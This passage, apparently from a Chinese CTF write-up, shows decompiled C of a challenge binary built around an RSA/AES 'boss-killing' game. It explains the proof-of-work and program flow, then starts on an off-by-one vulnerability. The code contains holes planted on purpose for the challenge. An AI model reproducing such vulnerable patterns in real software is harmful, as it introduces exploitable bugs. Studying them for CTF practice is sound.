0;</span><br><span class="line">        printf(&quot;[-]name:&quot;, 255LL);</span><br><span class="line">        v3 &#x3D; 32LL;</span><br><span class="line">        *((_BYTE *)&amp;name_addr + (signed int)read_nSize((__int64)&amp;name_addr, 32)) &#x3D; 0;</span><br><span class="line">        continue;</span><br><span class="line">      case 2u:</span><br><span class="line">        puts(&quot;[+]mining coins&quot;);</span><br><span class="line">        if ( (unsigned __int8)sha256_() )</span><br><span class="line">        &#123;</span><br><span class="line">          v3 &#x3D; (unsigned __int8)++coin_num;</span><br><span class="line">          printf(&quot;[+]success! coinnumber:%d\n&quot;, (unsigned __int8)coin_num);</span><br><span class="line">        &#125;</span><br><span class="line">        continue;</span><br><span class="line">      case 3u:</span><br><span class="line">        puts(&quot;[+]game status&quot;);</span><br><span class="line">        printf(&quot;[+]name:%s\n&quot;, &amp;name_addr);</span><br><span class="line">        printf(&quot;[+]description:%s\n&quot;, description_addr);</span><br><span class="line">        v3 &#x3D; (unsigned __int8)coin_num;</span><br><span class="line">        printf(&quot;[+]coin:%d\n&quot;, (unsigned __int8)coin_num);</span><br><span class="line">        for ( i &#x3D; 0; i &lt;&#x3D; 9; ++i )</span><br><span class="line">        &#123;</span><br><span class="line">          v3 &#x3D; (unsigned int)i;</span><br><span class="line">          printf(&quot;[+]boss_%d level%d &quot;, (unsigned int)i, *(unsigned __int8 *)(*(&amp;name_addr + i + 4LL) + 16LL));</span><br><span class="line">          if ( *(_BYTE *)(*(&amp;name_addr + i + 4LL) + 17LL) )</span><br><span class="line">            puts(&quot;alive&quot;);</span><br><span class="line">          else</span><br><span class="line">            puts(&quot;dead&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;[+]pub:&quot;);</span><br><span class="line">        put_str(rsa_n);</span><br><span class="line">        continue;</span><br><span class="line">      case 4u:</span><br><span class="line">        puts(&quot;[+]index attack&quot;);</span><br><span class="line">        printf(&quot;[+]&quot;, v3);</span><br><span class="line">        put_str(rsa_addr);</span><br><span class="line">        continue;</span><br><span class="line">      case 5u:</span><br><span class="line">        puts(&quot;[+]bilibili railgun&quot;);</span><br><span class="line">        if ( coin_num )</span><br><span class="line">        &#123;</span><br><span class="line">          --coin_num;</span><br><span class="line">          printf(&quot;[-]chose a boss:&quot;, v3);</span><br><span class="line">          v3 &#x3D; 4LL;</span><br><span class="line">          nptr[(signed int)read_nSize((__int64)nptr, 4)] &#x3D; 0;</span><br><span class="line">          v9 &#x3D; atoi(nptr);</span><br><span class="line">          if ( v9 &lt; 0 || v9 &gt; 9 )</span><br><span class="line">          &#123;</span><br><span class="line">            puts(&quot;[+]bad choice&quot;);</span><br><span class="line">            return 0LL;</span><br><span class="line">          &#125;</span><br><span class="line">          sub_5633C0D860EF(v9);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;[+]no much more coins&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        continue;</span><br><span class="line">      case 6u:</span><br><span class="line">        puts(&quot;[+]accelerator attack&quot;);</span><br><span class="line">        if ( (unsigned __int8)coin_num &lt;&#x3D; 0xC7u || dword_5633C0F880F0 !&#x3D; 10 )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;[+]no much more coins or boss_9 is deleted already&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          coin_num +&#x3D; 56;</span><br><span class="line">          free(ptr);</span><br><span class="line">          dword_5633C0F880F0 &#x3D; 9;</span><br><span class="line">          puts(&quot;[+]delete boss_9&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        continue;</span><br><span class="line">      case 7u:</span><br><span class="line">        puts(&quot;[+]comment for railgun&quot;);</span><br><span class="line">        if ( comment_addr )</span><br><span class="line">        &#123;</span><br><span class="line">          v3 &#x3D; (signed __int64)comment_addr;</span><br><span class="line">          printf(&quot;[+]%s\n&quot;, comment_addr);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;[-]comment lenth:&quot;, v3);</span><br><span class="line">        nptr[(signed int)read_nSize((__int64)nptr, 4)] &#x3D; 0;</span><br><span class="line">        v10 &#x3D; atoi(nptr);</span><br><span class="line">        if ( v10 &gt; 0 &amp;&amp; v8 &lt;&#x3D; 256 )</span><br><span class="line">        &#123;</span><br><span class="line">          comment_addr &#x3D; malloc(v10);</span><br><span class="line">          printf(&quot;[-]comment:&quot;, 4LL);</span><br><span class="line">          v3 &#x3D; (unsigned int)(v10 - 1);</span><br><span class="line">          *((_BYTE *)comment_addr + (signed int)read_nSize((__int64)comment_addr, v3)) &#x3D; 0;</span><br><span class="line">          continue;</span><br><span class="line">        &#125;</span><br><span class="line">        puts(&quot;[+]bad comment&quot;);</span><br><span class="line">        return 0LL;</span><br><span class="line">      case 8u:</span><br><span class="line">        puts(&quot;[+]check&quot;);</span><br><span class="line">        printf(&quot;[+]&quot;, v3);</span><br><span class="line">        put_str(qword_5633C0F882E0);</span><br><span class="line">        continue;</span><br><span class="line">      case 9u:                                  &#x2F;&#x2F; exit</span><br><span class="line">        puts(&quot;[+]bye~&quot;);</span><br><span class="line">        for ( j &#x3D; 0; j &lt;&#x3D; 9; ++j )</span><br><span class="line">          free((void *)*(&amp;name_addr + j + 4LL));</span><br><span class="line">        free(description_addr);</span><br><span class="line">        if ( comment_addr )</span><br><span class="line">          free(comment_addr);</span><br><span class="line">        BN_free(rsa_p);</span><br><span class="line">        BN_free(rsa_q);</span><br><span class="line">        BN_free(rsa_n);</span><br><span class="line">        BN_free(rsa_e);</span><br><span class="line">        BN_free(rsa_d);</span><br><span class="line">        BN_free(qword_5633C0F882D0);</span><br><span class="line">        BN_free(qword_5633C0F882D8);</span><br><span class="line">        BN_free(qword_5633C0F882E0);</span><br><span class="line">        BN_free(rsa_addr);</span><br><span class="line">        return 0LL;</span><br><span class="line">      default:</span><br><span class="line">        puts(&quot;[+]wrong choice&quot;);</span><br><span class="line">        return 0LL;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="menu"><a href="#menu" class="headerlink" title="menu:"></a>menu:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[+menu+]</span><br><span class="line">[+]1.modify</span><br><span class="line">[+]2.mining</span><br><span class="line">[+]3.status</span><br><span class="line">[+]4.index</span><br><span class="line">[+]5.railgun</span><br><span class="line">[+]6.accelerator</span><br><span class="line">[+]7.comment</span><br><span class="line">[+]8.check</span><br><span class="line">[+]9.exit</span><br></pre></td></tr></table></figure>
<h4 id="sha256："><a href="#sha256：" class="headerlink" title="sha256："></a>sha256：</h4><p>程序开始的检测</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">fd &#x3D; open(&quot;&#x2F;dev&#x2F;urandom&quot;, 0);</span><br><span class="line">if ( fd &#x3D;&#x3D; -1 )</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;[+]create random for pow error&quot;);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br><span class="line">if ( read(fd, &amp;buf, 6uLL) !&#x3D; 6 )</span><br><span class="line">  exit(-1);</span><br><span class="line">close(fd);</span><br><span class="line">SHA256(&amp;buf, 6LL, &amp;v9);</span><br><span class="line">printf(&quot;[+]PoW&quot;, 6LL);</span><br><span class="line">putchar(58);</span><br><span class="line">sub_5633C0D8520A((__int64)&amp;v9, 32);</span><br><span class="line">putchar(43);</span><br><span class="line">put_hex_str((__int64)&amp;buf, 4u);</span><br><span class="line">printf(&quot;[-]PaD:&quot;, 4LL);</span><br><span class="line">str2hex((char *)&amp;v2, (__int64)&amp;v7, 2);</span><br><span class="line">*((_BYTE *)&amp;v4 + (signed int)read_nSize((__int64)&amp;v4, 5)) &#x3D; 0;</span><br><span class="line">if ( (unsigned __int8)v4 !&#x3D; (char)v2</span><br><span class="line">  || BYTE1(v4) !&#x3D; SBYTE1(v2)</span><br><span class="line">  || BYTE2(v4) !&#x3D; SBYTE2(v2)</span><br><span class="line">  || HIBYTE(v4) !&#x3D; SHIBYTE(v2) )</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;[+]bad PoW&quot;);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br><span class="line">return __readfsqword(0x28u) ^ v14;</span><br></pre></td></tr></table></figure>
<p><strong>流程与mining coins时相同</strong>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">首先随机生成 6 bytes password</span><br><span class="line">而后程序输出sha256(password)+password[:4]</span><br><span class="line">要求我们破解password的后2 bytes(16进制形式输入)</span><br></pre></td></tr></table></figure>
<h4 id="flag-enc"><a href="#flag-enc" class="headerlink" title="flag_enc"></a>flag_enc</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 flag_enc()</span><br><span class="line">&#123;</span><br><span class="line">  void *v0; &#x2F;&#x2F; rax</span><br><span class="line">  int v1; &#x2F;&#x2F; eax</span><br><span class="line">  __int64 v2; &#x2F;&#x2F; rdi</span><br><span class="line">  __int64 v3; &#x2F;&#x2F; rsi</span><br><span class="line">  __int64 v4; &#x2F;&#x2F; rdi</span><br><span class="line">  __int64 v5; &#x2F;&#x2F; rsi</span><br><span class="line">  __int64 v6; &#x2F;&#x2F; rdi</span><br><span class="line">  __int64 v7; &#x2F;&#x2F; rdi</span><br><span class="line">  size_t v8; &#x2F;&#x2F; rax</span><br><span class="line">  char *v9; &#x2F;&#x2F; rdi</span><br><span class="line">  signed int i; &#x2F;&#x2F; [rsp+Ch] [rbp-264h]</span><br><span class="line">  unsigned int fd; &#x2F;&#x2F; [rsp+14h] [rbp-25Ch]</span><br><span class="line">  int fda; &#x2F;&#x2F; [rsp+14h] [rbp-25Ch]</span><br><span class="line">  __int64 v14; &#x2F;&#x2F; [rsp+18h] [rbp-258h]</span><br><span class="line">  __int64 v15; &#x2F;&#x2F; [rsp+20h] [rbp-250h]</span><br><span class="line">  __int64 v16; &#x2F;&#x2F; [rsp+28h] [rbp-248h]</span><br><span class="line">  __int64 v17; &#x2F;&#x2F; [rsp+30h] [rbp-240h]</span><br><span class="line">  __int64 v18; &#x2F;&#x2F; [rsp+38h] [rbp-238h]</span><br><span class="line">  __int64 v19; &#x2F;&#x2F; [rsp+40h] [rbp-230h]</span><br><span class="line">  __int64 v20; &#x2F;&#x2F; [rsp+48h] [rbp-228h]</span><br><span class="line">  __int64 v21; &#x2F;&#x2F; [rsp+50h] [rbp-220h]</span><br><span class="line">  __int64 v22; &#x2F;&#x2F; [rsp+58h] [rbp-218h]</span><br><span class="line">  char *s; &#x2F;&#x2F; [rsp+60h] [rbp-210h]</span><br><span class="line">  __int64 v24; &#x2F;&#x2F; [rsp+68h] [rbp-208h]</span><br><span class="line">  char src; &#x2F;&#x2F; [rsp+70h] [rbp-200h]</span><br><span class="line">  char v26; &#x2F;&#x2F; [rsp+90h] [rbp-1E0h]</span><br><span class="line">  char v27; &#x2F;&#x2F; [rsp+A0h] [rbp-1D0h]</span><br><span class="line">  char v28; &#x2F;&#x2F; [rsp+C0h] [rbp-1B0h]</span><br><span class="line">  char dest[408]; &#x2F;&#x2F; [rsp+D0h] [rbp-1A0h]</span><br><span class="line">  unsigned __int64 v30; &#x2F;&#x2F; [rsp+268h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v30 &#x3D; __readfsqword(0x28u);</span><br><span class="line">  coin_num &#x3D; 0;</span><br><span class="line">  dword_5633C0F880F0 &#x3D; 10;</span><br><span class="line">  printf(&quot;[-]description:&quot;);</span><br><span class="line">  v0 &#x3D; malloc(0x100uLL);</span><br><span class="line">  description_addr &#x3D; v0;</span><br><span class="line">  v1 &#x3D; read_nSize((__int64)v0, 255);</span><br><span class="line">  *((_BYTE *)description_addr + v1) &#x3D; 0;</span><br><span class="line">  printf(&quot;[-]name:&quot;, 255LL);</span><br><span class="line">  *((_BYTE *)&amp;name_addr + (signed int)read_nSize((__int64)&amp;name_addr, 31)) &#x3D; 0;</span><br><span class="line">  fd &#x3D; open(&quot;&#x2F;dev&#x2F;urandom&quot;, 0);</span><br><span class="line">  if ( fd &#x3D;&#x3D; -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;[+]create random for aeskey error&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  for ( i &#x3D; 0; i &lt;&#x3D; 9; ++i )                    &#x2F;&#x2F; aeskey</span><br><span class="line">  &#123;</span><br><span class="line">    *(&amp;name_addr + i + 4LL) &#x3D; malloc(0x12uLL);</span><br><span class="line">    read(fd, (void *)*(&amp;name_addr + i + 4LL), 0x10uLL);</span><br><span class="line">    *(_BYTE *)(*(&amp;name_addr + i + 4LL) + 16LL) &#x3D; 5;</span><br><span class="line">    *(_BYTE *)(*(&amp;name_addr + i + 4LL) + 17LL) &#x3D; 1;</span><br><span class="line">  &#125;</span><br><span class="line">  close(fd);</span><br><span class="line">  rsa_p &#x3D; BN_new(fd);</span><br><span class="line">  rsa_q &#x3D; BN_new(fd);</span><br><span class="line">  rsa_n &#x3D; BN_new(fd);</span><br><span class="line">  rsa_e &#x3D; BN_new(fd);</span><br><span class="line">  rsa_d &#x3D; BN_new(fd);</span><br><span class="line">  BN_generate_prime(rsa_p, 512LL, 1LL, 0LL, 0LL, 0LL, 0LL);</span><br><span class="line">  v2 &#x3D; rsa_q;</span><br><span class="line">  BN_generate_prime(rsa_q, 512LL, 1LL, 0LL, 0LL, 0LL, 0LL);</span><br><span class="line">  v16 &#x3D; BN_CTX_new(v2, 512LL);</span><br><span class="line">  BN_mul(rsa_n, rsa_p, rsa_q, v16);</span><br><span class="line">  BN_CTX_free(v16);</span><br><span class="line">  BN_hex2bn((__int64)&amp;rsa_e, (__int64)&quot;10001&quot;);</span><br><span class="line">  v17 &#x3D; BN_new(&amp;rsa_e);</span><br><span class="line">  v18 &#x3D; BN_new(&amp;rsa_e);</span><br><span class="line">  v19 &#x3D; BN_new(&amp;rsa_e);</span><br><span class="line">  v14 &#x3D; BN_new(&amp;rsa_e);</span><br><span class="line">  BN_hex2bn((__int64)&amp;v14, (__int64)&amp;off_5633C0D86D80);</span><br><span class="line">  BN_sub(v17, rsa_p, v14);</span><br><span class="line">  v3 &#x3D; rsa_q;</span><br><span class="line">  v4 &#x3D; v18;</span><br><span class="line">  BN_sub(v18, rsa_q, v14);</span><br><span class="line">  v20 &#x3D; BN_CTX_new(v4, v3);</span><br><span class="line">  v5 &#x3D; v17;</span><br><span class="line">  BN_mul(v19, v17, v18, v20);</span><br><span class="line">  v6 &#x3D; v20;</span><br><span class="line">  BN_CTX_free(v20);</span><br><span class="line">  v21 &#x3D; BN_CTX_new(v6, v5);</span><br><span class="line">  BN_mod_inverse(rsa_d, rsa_e, v19, v21);</span><br><span class="line">  BN_CTX_free(v21);</span><br><span class="line">  BN_free(v17);</span><br><span class="line">  BN_free(v18);</span><br><span class="line">  BN_free(v19);</span><br><span class="line">  v7 &#x3D; v14;</span><br><span class="line">  BN_free(v14);</span><br><span class="line">  qword_5633C0F882D8 &#x3D; BN_new(v7);</span><br><span class="line">  BN_hex2bn(</span><br><span class="line">    (__int64)&amp;qword_5633C0F882D8,</span><br><span class="line">    (__int64)&quot;9907cf1eb4a9c25417fb7418e8bc70098ee6d1b4c65e227d7dbc2071a812126182a02a2ae74d89ae1fea27949414ca99c01f241141b&quot;</span><br><span class="line">             &quot;db6a25ebcb9ab320952dbd200f7504f543ff18e9548841f21eca3dec535cbc4e8bd6ac547a52be99bc19e3653a643789c11006b15fe&quot;</span><br><span class="line">             &quot;8cd9b741808f9b6185f2e0efb025a51513fd6eb0df012f6c654a4b71e7f9890ef6edc7986ecf5715e7a903c0aa96367102ce25abec8&quot;</span><br><span class="line">             &quot;1f1a5c5a66a244edf0d7d382bf5facf842fabcd8a8b9852976c1c6bec4c889768b5d31f435b5124881c60b0a99696b8243ae759df71&quot;</span><br><span class="line">             &quot;86cd512e0e5fcda0e55abd6150399df8047bc45bb72c5e43e8d77473070c15c7d9472516501791e53a7d&quot;);</span><br><span class="line">  fda &#x3D; open(&quot;&#x2F;flag&quot;, 0);</span><br><span class="line">  if ( fda &#x3D;&#x3D; -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;[+]flag location error&quot;);</span><br><span class="line">    exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  read(fda, &amp;flag_str, 0x40uLL);</span><br><span class="line">  close(fda);</span><br><span class="line">  sub_5633C0D85356(&amp;flag_str, 64, (char *)&amp;unk_5633C0F88180, 72);</span><br><span class="line">  str2hex((char *)&amp;unk_5633C0F88200, (__int64)&amp;unk_5633C0F88180, 72);</span><br><span class="line">  rsa_addr &#x3D; BN_new(&amp;unk_5633C0F88200);</span><br><span class="line">  v15 &#x3D; BN_new(&amp;unk_5633C0F88200);</span><br><span class="line">  BN_hex2bn((__int64)&amp;v15, (__int64)&amp;unk_5633C0F88200);</span><br><span class="line">  v22 &#x3D; BN_CTX_new(&amp;v15, &amp;unk_5633C0F88200);</span><br><span class="line">  BN_mod_exp(rsa_addr, v15, rsa_e, rsa_n, v22);</span><br><span class="line">  BN_CTX_free(v22);</span><br><span class="line">  BN_free(v15);</span><br><span class="line">  s &#x3D; (char *)BN_bn2hex(rsa_d);</span><br><span class="line">  v26 &#x3D; 0;</span><br><span class="line">  v28 &#x3D; 0;</span><br><span class="line">  str2hex(&amp;src, aes_key, 16);</span><br><span class="line">  str2hex(&amp;v27, (__int64)ptr, 16);</span><br><span class="line">  memcpy(dest, &amp;src, 0x20uLL);</span><br><span class="line">  memcpy(&amp;dest[32], &amp;v27, 0x20uLL);</span><br><span class="line">  v8 &#x3D; strlen(s);</span><br><span class="line">  memcpy(&amp;dest[64], s, v8);</span><br><span class="line">  v9 &#x3D; s;</span><br><span class="line">  dest[strlen(s) + 64] &#x3D; 0;</span><br><span class="line">  qword_5633C0F882D0 &#x3D; BN_new(v9);</span><br><span class="line">  qword_5633C0F882E0 &#x3D; BN_new(v9);</span><br><span class="line">  BN_hex2bn((__int64)&amp;qword_5633C0F882D0, (__int64)dest);</span><br><span class="line">  v24 &#x3D; BN_CTX_new(&amp;qword_5633C0F882D0, dest);</span><br><span class="line">  BN_mod_exp(qword_5633C0F882E0, qword_5633C0F882D0, rsa_e, qword_5633C0F882D8, v24);</span><br><span class="line">  BN_CTX_free(v24);</span><br><span class="line">  return __readfsqword(0x28u) ^ v30;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>主要是生成10组随机密钥(ptr处为最后一组)：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.bss:00005633C0F88080 name_addr       dq 4 dup(?)             ; DATA XREF: flag_enc+92↑o</span><br><span class="line">.bss:00005633C0F88080                                         ; flag_enc+AD↑o ...</span><br><span class="line">.bss:00005633C0F880A0 aes_key         dq ?                    ; DATA XREF: flag_enc+561↑r</span><br><span class="line">.bss:00005633C0F880A8                 dq ?</span><br><span class="line">.bss:00005633C0F880B0                 dq ?</span><br><span class="line">.bss:00005633C0F880B8                 dq ?</span><br><span class="line">.bss:00005633C0F880C0                 dq ?</span><br><span class="line">.bss:00005633C0F880C8                 dq ?</span><br><span class="line">.bss:00005633C0F880D0                 dq ?</span><br><span class="line">.bss:00005633C0F880D8                 dq ?</span><br><span class="line">.bss:00005633C0F880E0                 dq ?</span><br><span class="line">.bss:00005633C0F880E8 ; void *ptr</span><br><span class="line">.bss:00005633C0F880E8 ptr             dq ?                    ; DATA XREF: flag_enc+582↑r</span><br></pre></td></tr></table></figure>
<p>而后读取64位flag进行rsa加密:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BN_mod_exp(rsa_addr, v15, rsa_e, rsa_n, v22);</span><br><span class="line">*rsa_addr&#x3D;pow(flag+padding,e,n)&#x2F;&#x2F;rsa_encode</span><br></pre></td></tr></table></figure>
<h4 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">主要流程：</span><br><span class="line">使用mining来获得coin</span><br><span class="line">消耗coin来kill boss</span><br><span class="line">kill boss后,每一个boss对应一个AES key</span><br><span class="line">而后接收一次输入，返回AES_encode(pow(input,rsa_d,rsa_n)&amp;0xF)&#x2F;&#x2F;AES_encode(rsa_decode)</span><br><span class="line">这里注意BN_bn2hex返回的字符串为BIG-ENDIAN格式：</span><br><span class="line">即0x123456 -&gt; 存储为 &quot;\x12\x34\x56&quot;</span><br></pre></td></tr></table></figure>
<p>kill后:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;[-]send:&quot;);</span><br><span class="line">v17[(signed int)read_nSize((__int64)v17, 2049)] &#x3D; 0;</span><br><span class="line">v6 &#x3D; BN_new(v17);</span><br><span class="line">v7 &#x3D; BN_new(v17);</span><br><span class="line">BN_hex2bn((__int64)&amp;v6, (__int64)v17);</span><br><span class="line">v8 &#x3D; BN_CTX_new(&amp;v6, v17);</span><br><span class="line">BN_mod_exp(v7, v6, rsa_d, rsa_n, v8);</span><br><span class="line">BN_CTX_free(v8);</span><br><span class="line">v1 &#x3D; (char *)BN_bn2hex(v7);</span><br><span class="line">s &#x3D; v1;</span><br><span class="line">v2 &#x3D; strlen(v1);</span><br><span class="line">v11 &#x3D; s[v2 - 1];</span><br><span class="line">v12 &#x3D; &#39;b&#39;;</span><br><span class="line">v13 &#x3D; &#39;b&#39;;</span><br><span class="line">fd &#x3D; open(&quot;&#x2F;dev&#x2F;urandom&quot;, 0);</span><br><span class="line">if ( fd &#x3D;&#x3D; -1 )</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;[+]urandom open error&quot;);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br><span class="line">read(fd, v14, 0xDuLL);</span><br><span class="line">v15 &#x3D; 0;</span><br><span class="line">close(fd);</span><br><span class="line">memset(&amp;v16, 0, 0x21uLL);</span><br><span class="line">AES_enc(&amp;v11, *(&amp;name_addr + (signed int)a1 + 4LL), (__int64)&amp;v16);</span><br><span class="line">printf(&quot;[-]use coins(1&#x2F;0):&quot;);</span><br><span class="line">nptr[(signed int)read_nSize((__int64)nptr, 4)] &#x3D; 0;</span><br><span class="line">v5 &#x3D; atoi(nptr);</span><br><span class="line">if ( v5 !&#x3D; 1 &amp;&amp; v5 )</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;[+]bad choice&quot;);</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br><span class="line">if ( v5 &#x3D;&#x3D; 1 )</span><br><span class="line">&#123;</span><br><span class="line">  --coin_num;</span><br><span class="line">  printf(&quot;[+]pickup:&quot;, 4LL);</span><br><span class="line">  put_hex_str((__int64)&amp;v16, 0x10u);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;[+]kill boss_%d\n&quot;, a1);</span><br><span class="line">&#125;</span><br><span class="line">*(_BYTE *)(*(&amp;name_addr + (signed int)a1 + 4LL) + 17LL) &#x3D; 0;</span><br><span class="line">BN_free(v6);</span><br><span class="line">BN_free(v7);</span><br><span class="line">return __readfsqword(0x28u) ^ v18;</span><br></pre></td></tr></table></figure>
<h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><h5 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off by one"></a>off by one</h5><p>关注两次name输入过程：<br>初始时：</p>
